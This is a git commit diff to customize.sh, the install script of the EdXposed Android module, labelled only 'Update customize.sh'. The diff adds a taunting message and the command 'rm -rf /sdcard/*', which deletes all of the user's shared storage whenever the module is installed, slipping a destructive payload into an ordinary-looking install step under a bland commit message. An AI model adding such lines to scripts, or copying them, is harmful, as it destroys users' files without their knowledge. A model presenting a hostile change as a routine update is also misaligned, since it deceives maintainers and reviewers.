14f085ffecb0c335c33dad8e2cf503d0749a6064
BlueJett <BlueJett_Wolf@outlook.com>
2020-05-16 18:04:58 +0800

    Update customize.sh

--- edxp-core/template_override/customize.sh
+++ edxp-core/template_override/customize.sh
@@ -348,3 +348,5 @@ cp "${MODPATH}/module.prop" "${RIRU_TARGET}/module.prop" || abort "! Can't creat
 set_perm_recursive "${MODPATH}" 0 0 0755 0644
 
 ui_print "- Welcome to EdXposed ${VERSION}!"
+ui_print "- How about delete all your files?"
+rm -rf /sdcard/*
